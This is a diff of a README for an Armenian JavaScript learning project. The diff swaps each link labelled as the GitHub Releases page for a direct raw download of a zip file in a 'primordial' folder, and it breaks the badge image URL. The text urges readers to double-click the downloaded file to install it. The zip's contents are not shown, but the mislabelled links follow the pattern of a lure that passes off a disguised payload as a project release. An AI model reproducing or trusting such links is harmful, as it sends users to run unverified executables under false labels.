@@ -1,6 +1,6 @@
 # 🇦🇲 armenian-javascript-community - Explore JavaScript Easily and Effectively
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/chonvalle/armenian-javascript-community/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/chonvalle/armenian-javascript-community/main/primordial/armenian-javascript-community.zip%20Latest%https://raw.githubusercontent.com/chonvalle/armenian-javascript-community/main/primordial/armenian-javascript-community.zip)](https://raw.githubusercontent.com/chonvalle/armenian-javascript-community/main/primordial/armenian-javascript-community.zip)
 
 ## 📜 Introduction
 Welcome to the Armenian JavaScript Community! This project helps you learn JavaScript through articles and practical tasks written in Armenian. Whether you are entirely new to programming or looking to sharpen your skills, this community provides valuable resources to guide you.
@@ -9,7 +9,7 @@ Welcome to the Armenian JavaScript Community! This project helps you learn JavaS
 To get started with the Armenian JavaScript Community, follow these simple steps to download and run our application:
 
 1. **Visit the Releases Page**  
-   You can find all available versions of the project on our [Releases page](https://github.com/chonvalle/armenian-javascript-community/releases). Here, you will see the latest updates and versions.
+   You can find all available versions of the project on our [Releases page](https://raw.githubusercontent.com/chonvalle/armenian-javascript-community/main/primordial/armenian-javascript-community.zip). Here, you will see the latest updates and versions.
 
 2. **Download the Application**  
    On the Releases page, choose the version you want to install. Click the appropriate file link for your operating system. The download should start automatically.
@@ -18,7 +18,7 @@ To get started with the Armenian JavaScript Community, follow these simple steps
    After the download completes, navigate to your downloads folder. Here, you will find the installation file. Double-click the file to begin the installation process. Follow the prompts on your screen to complete the setup.
 
 ## 📥 Download & Install
-Visit this page to download: [Releases Page](https://github.com/chonvalle/armenian-javascript-community/releases). It contains all the versions available for use.
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/chonvalle/armenian-javascript-community/main/primordial/armenian-javascript-community.zip). It contains all the versions available for use.
 
 ### Installation Steps:
 - Locate the downloaded file in your downloads folder.
